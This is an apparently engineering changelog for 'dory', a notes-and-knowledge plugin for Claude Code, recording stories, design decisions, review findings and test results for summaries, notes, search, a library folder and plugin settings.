**Open for S4 (architect, second half of a P3).** The session start decides on the whole text (header, queue lines and list paths included, as criterion 4 requires), and Record 003 has the worker summarize a context "when its text exceeds the limit", meaning the files alone. A context whose files fit but whose whole text does not would be marked at every session start and skipped by every worker pass. S4 has to use one threshold on both sides. One way: both compare `context.text` against the summary's target of 80 % of the limit, and the session start marks only in that case.

**Review findings.** First pass (architect, code reviewer, security auditor, all `correct`):
- P2, found by all three: `_lists_section` raised `TypeError` on a `notes/*.md` with an empty or list-valued `type`, because the parser returns `[]` for `type:`. The hook logs the exception and injects nothing, so one such file switched off the session start everywhere. Fixed with the `str()` coercion of the old `Note.type`, with a test.
- P3: the same regression in the `Note.domain` moved into `search.py` (fixed, with a test).
- P3: an unused entry count from `_fill_section` (removed).
- P3: list visibility for a private project and an unknown repository untested (two assertions).
- P3: the context text lived only as private helpers in the hook module (moved into `context.py`; the threshold half is open for S4, see above).

Each fix has a test that fails on the old code, except the two refactors.

Second pass (code reviewer, `correct`, 0.88): no findings; the move into `context.py` leaves the output byte for byte the same.

**Checked.** 168 unit tests green, ruff clean. No live run: the session start does not call `claude`, and the story's criteria are unit tests.

## Record 003, Story S4: a summary when the files exceed the limit (2026-10-19)

**User story.** As a user with a lot of knowledge in a project, I want the session start to load a summary the worker made beforehand when the files exceed the limit, so that dory's share of the context stays within the limit and the session start never waits for a model.

**What it solves.** A project whose files no longer fit gets a summary instead of a text cut off after the first file. The worker writes it after a session of the project, or when a session start asks for it, with a `claude -p` run without tools: about 12 seconds and 0.0016 USD with Haiku for the 14,000-character file of the S2 size check. The summary for that file had 2,350 characters in German, pitfalls first, with the eight services' commands kept. The next session start loads it and lists the paths of the full files under it. If the files have changed since, the old summary still loads with a line saying so, and the worker makes a new one in the background. Without a usable summary the files load cut, as in S3.

**Implementation.**
- `summary.py` (new, imported by the hook): contexts (project name, `_general`, `_outside`) with their files and domain, the one threshold (`needs_summary`: the context text against 80 % of the limit), the hash over text, domain, note language and limit, the store `<state>/summaries/<context>.md` (header with hash and domain, written through a temporary file), the `.wanted` marks.
- `summarize.py` (new): the command (`--restricted --tools "" --strict-mcp-config`, hooks off, own system prompt that frames the files as data, one turn, no session persistence, 0.25 USD budget), `make_summarize` (the summary step of a worker pass: unmark, build the text, skip when within the target, up to date, or failed three times for this text; run; strip a code fence and a preamble line; cut at a line to the target with a marker; save; `kind: summary` in `runs.log` with the cost), a 3-minute timeout.
- `worker.run` takes the step after the drain, under the lock, for the contexts of the entries that are done plus every mark, once per context and pass; a transient or timed-out summary ends the pass; marks of contexts not tried yet keep the pass going.
- `recall.py`: over the limit and over the target, `_summary_or_files` loads the summary of the matching domain (with the stale line if the hash differs), and marks and starts the worker when it is missing or stale. `_fit` replaces `_cut` for both: front and tail first, then the body line by line, the marker only when something was cut.
- `spawn.py` (new): `spawn_worker`, moved out of `cli.py` so the hook can start the worker; `cli.py` passes the summary step to the worker. `state.summaries`.

**Decisions and reasoning.**
- One threshold for both sides (Record 003, new paragraph): the context text against the summary's target of 80 % of the limit. Before, the session start decided on the whole text and the worker on the files. A context whose files fit but whose whole text did not would then have been marked at every session start and skipped by every pass. The session start now cuts without a mark in that case, because a summary would not be shorter. Two S4 criteria now say "the summary's target" instead of "the limit".
- The domain of a context is `private` when it loads `private/`. A summary made for the other domain never loads; the files load cut instead.
- Failures count per text: three failed or timed-out runs for the same hash stop the retries until the text changes. A transient failure does not count, because a rate limit is not the text's fault.
- The marks of contexts already tried in a pass do not keep the pass going. Otherwise a session start that marks again during a failed job would make the worker loop.

**Live checks** (Haiku, 3 of 3 each): the probe of the command (summary in `result`, one turn, no session file or queue entry of dory although the worker marker was removed for the run), its positive control (without the disabled hooks, the installed dory plugin's session start writes its file, so the probe could see one), and the full project summarized within the target in German with a pitfall kept. No other live check was rerun: the ingest run is unchanged, and the worker live suite calls `run()` without the summary step.

**Mutations.** Six changes to the code were each caught by the unit tests: the domain check off, no mark, the threshold ignored, processed contexts not collected, no failure cap, a transient run not ending the pass. A seventh, after the review, covers the marker-only summary.

**Review findings.** First pass (architect `incorrect`, code reviewer `incorrect`, security auditor see below):
- P1, found by architect and code reviewer: the S3 test of the cut now took the new spawn path. Every `pytest` run started a real `dory worker` with the default state directory, which is the user's real one, the default vault `~/Obsidian/dory-brain` and English. A worker started that way would have processed any waiting entry of the real queue into the wrong vault. Checked on the real state: the queue was empty at each test run (the last real entry was processed at 15:29, the first test-started worker came at 15:43), `runs.log` has no line after 15:29, `~/Obsidian/dory-brain` does not exist. The only traces are two empty folders, `summaries/` and `baselines/`, in `~/.local/state/dory-brain`. Fixed in `tests/conftest.py`: `DORY_NO_SPAWN=1` for every test. After the fix, a full test run left the real state directory unchanged.
- P3: a summary cut down to the marker alone counted as done and would have replaced the files until they changed (fixed: it is a failure; test).
- P3: the "newer" assertion could not fail (now checks the stale line).
- P3: the end of the pass on a stopping summary step was only tested on the step (a test through `worker.run`: the pass stops, a later entry stays queued with no attempt).
- P3: two S4 criteria still said "limit" (record aligned).
- P2 (security auditor; it also reported the spawn above as P2): a repository directory named `_general` became the project `_general` and shared the reserved context name. Its session start would have loaded the summary of `general/` as stale and marked it at every start, without its own knowledge. Fixed: project contexts are named `project-<name>`, and a mark with a name dory does not give is ignored. The Record 003 line on contexts says so; a test with a repository named `_general`.

The security auditor found the domain boundary intact: a summary carries the domain of the files it was made from, and the session start loads it only on an exact match.

Second pass (code reviewer, `correct`, 0.85): all six fixes hold; one P3, a stale summary path in an S4 criterion (record aligned).

**Checked.** 188 unit tests green, ruff clean; the three live summary checks 3 of 3 with Haiku, and once more on the end state after the rename (0.001 USD, 10 s, 2,263 characters). The real state directory stayed unchanged through every test run after the fix.

## Record 003, Story S5: `/dory:note` writes the user's notes (2026-10-19)

**User story.** As a user who wants something remembered right now, I want `/dory:note` to add it to the project's `notes.md`, or to `general/` or `private/` when it applies beyond the project, so that my own words reach later sessions and the worker never rewrites them.

**What it solves.** `/dory:note "Loki port 3100 clashes with Grafana"` in a project now adds `- 2026-10-19: Loki port 3100 clashes with Grafana` to `projects/<project>/notes.md`, word for word. "remember in general: Python packages with uv instead of pip" goes into `general/notes.md` without the routing words. A note about the home NAS goes into `private/notes.md`, also from a work project. "add milk to the shopping list" still goes onto the list under `notes/`, inside a project too. The next session start loads the note, and a summary that covers the file is rebuilt in the background. A note added while the worker processes a session survives the run's post-run checks.

**Implementation.**
- `note.py`: `add_note` validates the scope and the text (whitespace collapsed to one line), finds the project, appends one dated bullet (the file is created with `type: notes` if missing), writes the same line into the baseline copies of queued entries, marks the context that loads the file and starts the worker. `NoteError` for an unknown scope, `project` outside a repository or an empty note; nothing is written then. `prepare_note` names the project, its domain from `scopes.project_domain`, the scopes with their paths and the rules; the project overview and the list of known projects are gone.
- `baseline.py`: `notes_copies` (where the unchecked baselines of queued entries keep a `notes.md`) and `notes_lock`, a short `flock` on `<state>/notes.lock`, held by `add_note`, by `capture` and by the notes restore in `check`.
- `cli.py`: `dory add-note --scope project|general|private`, the text as arguments or on stdin, the path on stdout, the error on stderr with exit 1.
- Note skill rewritten: a list item goes onto the list; anything else gets a scope and goes through `dory add-note` with a quoted heredoc, so quotes and `$` in the user's text reach the file unchanged. The rules' `/dory:note` section says a note keeps the user's words and language.

**Decisions and reasoning.**
- The skill only chooses; the code writes. The model never edits a `notes.md`, so the format (one dated bullet, newest last) cannot drift.
- The note goes in through stdin and a quoted heredoc rather than as a shell argument: the user's text may contain quotes, `$` or backticks.
- A private note from a work project marks `_outside`, the context that loads `private/`; the work project's own context does not load it.
- The same line twice in a row is written once, so a retry of the command does not duplicate it.

**Live checks** (`tests/test_live_note.py`, Haiku, the module skip of S2 removed): note in a project, general note from a project, home NAS note from a work project, shopping item in a project and outside a repository; 3 of 3 each, plus a full round after the review fixes. Each round of the seven checks takes about 70 seconds. The two search checks of 0.3.0 run again and pass; `test_search_finds_the_note_and_says_where` still searches a 0.3.0 single note and has to change in S6 (decision 5: those are no longer searched).

**Review findings.** First pass (architect, code reviewer, security auditor, all `correct`):
- P2, found by all three: `add-note` and a running worker shared no lock. A note written while `capture` hashed the scope files, or while the notes restore had read its copy, was undone by the restore and logged as `restored`. Two `add-note` calls at once could overwrite each other. A queued retry's checked baseline could be recreated under `capture`. Fixed: `notes_lock` around add-note's read and writes, around `capture` and around the notes restore, and no copy into checked baselines. Tests: add-note waits while the lock is held, two writers keep all 30 lines, capture and restore take the lock, checked baselines get no copy. Without the lock, two of them fail in three of three runs.
- P3: a private note from a work project marked the project's context (fixed, test).
- P3: test gaps closed: the text as arguments, a run that changed `notes.md` itself (restored, the user's line kept), and the live reply names the project's file.

Second pass (code reviewer, `correct`, 0.85): no findings. The lock is never taken twice in one call path and never held across the `claude -p` run, so it cannot deadlock with itself or with the worker lock, which never waits. Every interleaving of `add-note` with capture, check and a retry keeps the user's line. Two harmless leftovers: a racing `add-note` can recreate an empty baseline directory after `discard` (ignored without its marker and swept), and a narrow window can log a false `unexpected` line.

**Checked.** 203 unit tests green, ruff clean, the real state directory unchanged by every test run; live note checks as above.

## Record 003, Story S6: search finds single entries (2026-10-19)

**User story.** As a user looking for something dory knows, I want `/dory:search` to show the matching entries of the knowledge and notes files, besides session notes and lists, so that a hit shows the statement itself instead of a file that holds twenty.

**What it solves.** `/dory:search loki` in the hub now answers `- Loki only starts if UID 10001 owns the data directory. (Pitfalls) → projects/ai-assistant-hub/knowledge.md`. Before, it named whole files, and since 0.4.0 it would have found only the old single notes. The Grafana entry in the same file is not a hit. A note of the user's shows whole, with its date. In a work project no private entry, session note, list or path appears; outside a repository and in a private project everything does. Single notes and overviews from 0.3.0 are neither searched nor shown.

**Implementation.** `search.py` rewritten:
- **Candidates:** the entries of every `knowledge.md` and `notes.md` in `projects/<name>/`, `general/` and `private/` (`entries.parse`), each with its file and section; session notes under `sessions/`; lists and registers under `notes/`.
- **Domain:** by folder for `general/` and `private/`, by `scopes.project_domain` for a project folder, and by their own `domain` for notes and lists (lists private unless they say otherwise).
- **Weights:** the 0.3.0 weights kept (a lead or summary 3, tags and name 2, text 1), with words matched first.
- **Moved code gone:** the 0.3.0 `Note`, `scan`, `allowed` and the overview-based `project_domain` that S3 had moved here are removed.
- **Skill text:** reports statement, section and file.

**Review findings.** First pass (architect, code reviewer, security auditor):
- P2 (code reviewer), P3 (architect): the ranking test passed through the path order alone. Notes have no bold lead, so both hits scored the same. The test now puts the text-only hit in a file that sorts first; with flat weights it fails.
- P3, both: `_read` used `utf-8` where the replaced helpers used `utf-8-sig`. A list with a byte order mark disappeared, and the frontmatter of such a `knowledge.md` became a searchable entry. Fixed, with a test.
- P3 (code reviewer): a user note was cut to the 80-character key of the entry parser, mid-word. A note now shows whole; a knowledge entry shows its bold lead. Test added.

All three verdicts `correct`; the security auditor found every way into a work project's search output filtered and no new injection channel. No second pass: the three fixes are local (an encoding, a display function, a test) and each has a test that fails without it.

**Checked.** 206 unit tests green, ruff clean; three mutations of the domain boundary and one of the weights caught; the two live search checks 3 of 3 with Haiku, the first rewritten to find an entry of a `knowledge.md`.

## Record 003, Story S7: release 0.4.0 prepared (2026-10-19)

**User story.** As a user of the public plugin, I want these changes as version 0.4.0 with a changelog entry, so that `claude plugin update dory@brain` brings them and I know what happens to my old notes.

**What it solves.** The branch `feat/knowledge-file` carries version 0.4.0 in `pyproject.toml`, `plugin/.claude-plugin/plugin.json` and `plugin/dory/__init__.py` (`uv.lock` follows). The CHANGELOG entry names everything Story S7 asks for. README and project CLAUDE.md describe the 0.4.0 model. Record 003 is Done. Nothing is tagged or pushed; merging, tagging, pushing and installing stay with the author.

**Implementation.**
- **CHANGELOG 0.4.0:** one knowledge file per scope; the user's notes in `notes.md` and where `/dory:note` writes; the session start; the summary over the limit; the post-run checks with `runs.log` and `dory status`; search by entry; sibling projects; what happens to 0.3.0 notes; sessions started before the update.
- **README:**
  - "What you get", the commands, `recall_budget_tokens` and how-it-works, with step 5 now the post-run checks and a new step 6, the summary;
  - work and private, with how to mark a project private;
  - a new "Session start" section with the load table, replacing "Ranking at start";
  - the vault tree, undoing a change, and the record links.
- **CLAUDE.md:**
  - About, Current Status, Next Step (the release steps) and Architecture;
  - Recent Decisions: the 2026-10-16 line on single notes and renaming replaced by Record 003's model, and a new line: every test runs with `DORY_NO_SPAWN=1`.

**Review findings** (documentation review, code reviewer, `correct`, claims checked against the code):
- P2: the CHANGELOG advised deleting 0.3.0 overviews and promised that a private project stays private. That holds only while the overview exists until the project's first 0.4.0 run creates its `knowledge.md`. Deleted earlier, the project becomes work and writes `general/`. The CHANGELOG and README now say to keep such an overview until then or to set the domain in `knowledge.md`.
- P3: a session started before the update starts the 0.3.0 worker when it ends, and that worker processes everything in the queue the 0.3.0 way, not only its own session. The CHANGELOG and CLAUDE.md now say so.
- P3: only a note added through `/dory:note` survives a run; a hand edit to a `notes.md` during a run is undone (the known limit of S1). The CHANGELOG now says so.
- P3: the summary loads only when the whole text exceeds the limit and the files alone exceed 80 % of it; the README and CHANGELOG stated the 80 % alone, and one README sentence read as if a stale summary were not loaded. Corrected.
- P3: the CLAUDE.md did not say how to mark a project private (S7 criterion 3). Added to Architecture.

**Checked.** 206 unit tests green, ruff clean, version test green.

## Record 004, Story S1: file names and post-run checks for the new layout (2026-10-21)

**User story.** As a user whose notes and private files sit next to files a model edits, I want every worker run checked against the new layout, so that a touched note or private file shows up in `dory status` and every removed topic entry is reported. Foundation: nothing the user sees changes yet; S2's live checks read these results, S5 writes notes through the name function.

**What it solves.** The post-run checks now know the layout of Record 004: the project's `knowledge.md` and every topic file in `notes/` are compared entry by entry, lists and registers are not; the user's project notes and every `.md` under `private/` are watched and reported when a run creates, changes or deletes one, and nothing of the user's is restored any more (decision 11). dory itself writes nothing under `private/` except the empty folder. A title becomes a file name by one function. What the worker writes does not change yet: its task and rules still name `general/` and `private/` until S2, so the branch is not releasable.

**Implementation.**
- `names.py` (new): `file_stem` (NFC; whitespace and `[ ] # ^ | \ / :` become one space; leading dots, trailing dots and spaces trimmed; cut at 80 characters and 200 bytes; an empty result raises `TitleError`), `name_key` (NFC, casefolded) and `is_clean`.
- `baseline.py`: `create_skeletons` makes the project's `knowledge.md` and an empty `private/`, no files in `general/` or `private/`. `capture(vault, target, project, topics_allowed=...)` copies the project's `knowledge.md` and the top-level `.md` files of `notes/`, hashes every other `.md` under `projects/` and `private/`, and writes `layout.json` (the knowledge file and whether topics may be written). `check(vault, target)` reads the layout from the baseline, restores the knowledge file's keys and a changed list or register type, gives a new file in `notes/` `type: topic`, reports names that break the rules, watched files and a private project's topic writes as `unexpected`, and diffs the knowledge file and the topic files. `record_dory_write` replaces `notes_copies`: a file dory writes for the user while entries wait gets its new hash in their baselines.
- `ingest.py` and `note.py` call the new interface; `scopes.py` names the folders (`notes`, `private`) and the list types.

**Decisions and reasoning.**
- A baseline without `layout.json` comes from 0.4.0 and is discarded instead of kept: its checks would restore files under `private/` (Record 004 review). The layout lives in the baseline, so a retry checks with what the killed attempt captured, as the 0.4.0 file list did.
- A forbidden character leaves a space instead of nothing: "a/b" becomes "a b", not "ab". The record says "removed"; the space is the readable form of that.
- The hash covers only `.md` files under `private/`, so attachments are not read on every attempt.
- The untyped topic and the unreadable file (review) are handled where the record already put them: a list type the run gives an untyped file is taken back, an unreadable file is reported as `failed` by the checks.

**Why readable and maintainable.** `names.py` holds the naming rules in one place for the checks now and for `/dory:note` and the worker's rules later. `baseline.py` stays the one module that knows the run's guard; `check` reads like the record's list of post-run checks, one guarded step each. Tests read as the acceptance criteria (`test_private_files_a_run_touched_are_reported_and_dory_writes_nothing_there`).

**Review findings.** First pass (architect and code reviewer, both `correct`): P2, found by both, a run that gave an untyped topic file the type `list` kept the type and its removed entries went unreported (fixed: the list type is taken back and the baseline decides what is a topic; test fails on the old code); P3 one unreadable file in `notes/` made `capture` raise and every entry fail (fixed: the copy is guarded, the checks report the file as `failed`; test fails on the old code). Second pass (code reviewer, `correct`): P3 a note that could not be copied when the baseline was taken counted as created by the run, so the checks could write `type: topic` into the user's file and report all its entries as added (fixed: `layout.json` lists the notes present at capture, and an uncopied one is reported once as `failed` and otherwise left alone; test fails on the old code). Not reviewed a third time: the fix is local and covered.

**Checked.** 231 unit tests green, ruff clean. No live run: the story is deterministic.

## Record 004, Story S2: the worker keeps topic files in `notes/` (2026-10-21)

**User story.** As a user who works in several projects, I want the worker to write what applies beyond a project into one file per topic in `notes/`, and to leave my notes and my private folder alone, so that a pitfall found in one project is there for every other, filed under its subject. The story with the highest risk: its first criterion decided whether the design holds.

**What it solves.** The worker no longer knows `general/` or `private/`: a tool pitfall from a project session lands in `notes/<topic>.md`, extended when the topic exists; private content becomes no entry; the user's project notes are read and never changed. The run is denied reading `private/` and writing it or the project notes.

**Implementation.**
- `ingest.py`: `WORKER_SETTINGS` deny `Read`, `Edit` and `Write` on `private/**` and `Edit` and `Write` on `projects/*/notes/**`; `task.md` names the project's `knowledge.md`, every file in `notes/` with its type, the user's notes to read, that `private/` is closed, and for a private project that no topic file may be written (`TaskFiles`, `_task_files`, `_task_file_lines`).
- `scopes.py`: the layout helpers `knowledge_file`, `notes_folder_files`, `project_notes`, `file_type`; the baseline uses them instead of its own copies.
- Rules skill: `private/` is the user's; the user's notes are the project's note files and are linked in path form under `## Open`; "Where an insight goes" sends tool and service knowledge to a topic file and private content nowhere; a new section on topic files (one subject per file, the title names the subject, find the matching file first, naming rules, form of `knowledge.md`); lists live in `notes/` and are named by the same rules. Ingest skill: reads the project's notes, never `private/`, Greps the topic files.

**Decisions and reasoning.**
- The probe of the deny rules was built first, as the record asked. It showed in eight runs that `Read`, `Grep` and `Glob` on `private/` are denied, a path in other case (`PRIVATE/FAMILY/DEEP.md`) too, that a Grep over the whole vault finds nothing in `private/`, and that writing a project note is denied, in other case too. One early run failed on the positive control (Edit without a prior Read), not on a leak; the test now puts the security assertions first, asserts that every forbidden tool was tried, and reads before it edits.
- The test of the deny probe stays in `tests/test_live_bundle.py`; the 0.4.0 probe of `notes.md` is replaced.

**Why readable and maintainable.** The task text is built from data (`TaskFiles`) in one function per block; the layout lives in `scopes.py` once and the baseline, the task, the session start, the note command and the search all read it from there.

**Live checks** (Haiku). The whole rule suite once, 26 of 26 in 7 minutes; the new and changed checks three of three (knowledge lands in its scope, an insight extends the existing topic, a private note never reaches a topic file, a private project writes no topic file, a user note is never changed or repeated, a contradicted note is linked as open). The deny probe three of three after its fix, and eight runs without a leak in all.

## Record 004, Stories S3 and S4: the session start and summaries per project (2026-10-21)

**User story.** S3: as a user starting a session, I want my project notes and the project's knowledge in full, the private notes I linked, and the titles of everything in `notes/`, so that Claude follows my notes from the first answer and knows which topics exist without carrying them. S4: as a user with a lot in one project, I want the summary to cover exactly what the start loads in full, so that it stays within the limit and no private content outlives its link.

**Built together.** The summary's context is the session start's context (`summary.context_for` builds both from `context.loaded_files`), so changing the start changed the summaries' contexts in the same step; splitting them would have left the suite red between the two. Reviewed together with S2, S5 and S6.

**Implementation.**
- `links.py` (new): the links of a project note into `private/`: wikilinks and embeds with alias, heading and `.md`, Markdown links with an encoded or bracketed target, nothing inside code; a path from the vault root or a bare name, matched without case; every target resolved to its real path and kept only inside `private/` (a `private/` that is itself a link works).
- `context.py`: `loaded_files` gives the load order: the project's notes by name, each followed by the private notes it links first, then `knowledge.md`; outside a known project nothing.
- `recall.py`: the notes section lists every file in `notes/` with `(list)` or `(register)`, most recently `updated` first (file time without it). Room: front first, room kept for the titles' heading and closing line, then the paths of cut or summarized files, then the files, then the titles; a closing line counts what did not fit. The lists section by domain is gone.
- `summary.py`: `Context` knows whether the project is private and which private notes it loads (`linked`); a `Summary` carries `linked` in its header and `fits` a context only for the same domain and the same linked notes; `_general` and `_outside` name no context, so their marks go without a run. `summarize.py` uses `fits` and saves `linked`; its prompt names the project's notes and `private/` as the user's notes.

**Decisions and reasoning.**
- The titles fill what the files leave: a project's own notes and knowledge matter more in its sessions than the list of topics. Outside a project the titles get all the room.
- The left-out line points to the folder `notes/`, not to `/dory:search` (design review).

**Checked.** Unit tests of the start, the links and the summaries; the live summary check once (3 of 3 tests in one run).

**Review findings (S2 to S6, one pass, architect and code reviewer, both `correct`).** P3, found by both: a wikilink alias escaped for a table (`[[private/X\|alias]]`) did not resolve (fixed: the trailing backslash is dropped). P3: an indented or unclosed code fence did not hide the links in it, so an example link could load a private note (fixed: code is stripped line by line with the same fence toggle as `context.py`, an unclosed fence runs to the end). Each fix has a test that fails on the old code. Not reviewed a second time: both fixes are local to `links.py` and covered.

## Record 004, Story S5: `/dory:note` writes note files (2026-10-21)

**User story.** As a user who wants something remembered right now, I want `/dory:note` to write a note with a meaningful title, in the project or in the matching topic in `notes/`, so that I find it by its title in Obsidian and later sessions load it.

**Implementation.** `note.py`: `prepare_note` names the scopes `project` (`projects/<project>/notes/`) and `general` (`notes/`), the titles of the project's notes and of `notes/` with their types; `add_note(config, cwd, scope, title, text)` creates `projects/<project>/notes/<name>.md` (`type: note`, `created`) or a topic file in `notes/` (`type: topic`, `updated`), never overwrites a name in any case (checked by name key under the notes lock, then created with open mode `x`), records the project note in queued baselines, marks the project's summary and starts the worker; the scope `private` is gone. `cli.py`: `add-note --scope --title`. Note skill: list items as before; private content is not written and the reply points to `private/`; a project note gets a title and content from the request and the session; a general note extends the matching topic with Edit after the snapshot or creates one through `add-note`; no link into `private/` unless asked.

**Live checks** (Haiku, three of three, the two search checks included): a note after a session that solved the Loki port is one new file whose title names Loki and whose content says 3200, and nothing else changed (the session is played in two turns with `--continue`); "remember in general: uv instead of pip" corrects the one pip entry of the topic `Python` and creates no file; a note after talking about a private note is written without a link into `private/`; a health note writes nothing and the reply points to `private/`; milk goes onto the list in a project and outside one.

## Record 004, Story S6: search covers the whole vault (2026-10-21)

**Implementation.** `search.py`: entries of every project's `knowledge.md` and of every topic file in `notes/`; whole documents for the project notes, every `.md` under `private/` (subfolders too), lists, registers and session notes, titled by `summary` or file name; no domain filter. Files of 0.4.0 (`general/`, a project's `notes.md`) and anything in a subfolder of `notes/` or not Markdown are not searched.

## Record 004, Story S7: release 0.5.0 prepared (2026-10-21)

**Implementation.** Version 0.5.0 in the three files (the version test is green); CHANGELOG entry with what changes and what happens to the files 0.4.0 wrote; README (what happens automatically, the commands, `private/`, the session start, the vault); the project CLAUDE.md (About, Architecture, status, Recent Decisions, Next Step). Nothing tagged or pushed.

## Record 006: the library (2026-10-22)

**User story.** As a user who wants to file knowledge deliberately, I want a skill that proposes the folder, the title and the notes to link it from, writes after my yes, and makes the entry load where it belongs, while `/dory:note` stays quick and never writes into that folder.

**Implementation.**
- `scopes.py`: `LIBRARY` (`library/`) replaces `PRIVATE`; `LIBRARY_KEY` names the property; `OLD_PRIVATE` is only read for the hint to rename the folder.
- `links.py`: `library_entries` (the links of a text into `library/`, the frontmatter included) and `linked_by_property` (only the `library` property, for topic files).
- `context.py`: `topic_entries`, `library_files` (every entry a session in the project could load, for the worker).
- `recall.py`: a topic block carries the entries its property links, minus those already loaded; a `private/` with files gets one line asking the user to rename it.
- `baseline.py`: `library/` is watched; `_restore_library` puts a topic file's property back after a run; a new topic file loses one; `record_dory_write` updates the baseline's copy of a topic file that `dory link` changed while an entry waits.
- `ingest.py`: the deny rules name `library/**`; redacted copies of `library_files` go into `work/<id>/library/` and `task.md` names them as reference.
- `library.py` (new): `library_context`, `library_write`, `link`, `guard`; `cli.py`: `guard`, `library-context`, `library-write`, `link`. `frontmatter.add_list_item` writes the property as a block list.
- `note.py`: scope `notes` instead of `general`. Note skill: the `PreToolUse` hook on `Write|Edit` running `dory guard`; private content points to `/dory:library`. Library skill (new). Rules and ingest skill name `library/` and the copies.

**Decisions and reasoning.** See Record 006, decisions 1 to 9 and its implementation notes. The library skill writes only through dory commands because the note guard stays active for the rest of a session (probed live); it searches with `grep`, `rg` and `ls` because Claude Code 2.1.308 offers no Grep or Glob tool in a normal session.

**Checked.** `uv run pytest -q` and `ruff check` green. Live (Haiku): library and note checks three of three; a forced Edit of a library entry through `/dory:note` blocked by the guard; the worker's deny probe on `library/**`; the rule checks "knowledge lands in its scope" and "a library entry never reaches a topic file".

**Review findings (one pass, architect and code reviewer, both `correct`).** Six, all fixed with a test that fails on the code before; listed in Record 006 under Implementation Notes. Added at the same time: `add-note` and `library-write` refuse `"`, `$` and backticks in names, and tests that a project note's property loads only in its project and a link into `private/` loads nothing. The README became a short page with the idea and the commands; the details moved unchanged into `docs/guide.md`.

## Record 007: settings in Claude Code (2026-10-22)

**User story.** As a user, I want dory's main settings in Claude Code's `/config`, with opus as a worker model, so that I find and change them where Claude Code's own are.

**Implementation.** `plugin.json` declares `userConfig` (vault, language, model, context, context_window). `config.plugin_options` reads `pluginConfigs` from Claude Code's `settings.json` and the `CLAUDE_PLUGIN_OPTION_*` variables for what the file lacks; `load_config` puts them over config.toml. `tests/conftest.py` points `DORY_CLAUDE_SETTINGS` at an empty file and drops the option variables. The hook commands quote `${CLAUDE_PLUGIN_ROOT}`.

**Decisions and reasoning.** Record 007: the probe showed that only set options reach hooks and `settings.json`, and that skills get no variables, hence reading the file.

**Checked.** 293 unit tests and ruff; `claude plugin validate plugin`; end to end in an isolated `CLAUDE_CONFIG_DIR`: the plugin installed from the repo, five values set with `claude plugin configure`, read back by `load_config`; an invalid model refused by Claude Code.

**0.8.1 and 0.9.0 (2026-10-22).** The note language became a choice list of 16 languages, English by default (0.8.1), and the list ends with `Other (config.toml)`, which `config.plugin_options` treats as not set, so `language` in config.toml decides (0.9.0). Checked: 294 unit tests; the two new config tests fail on the code before.
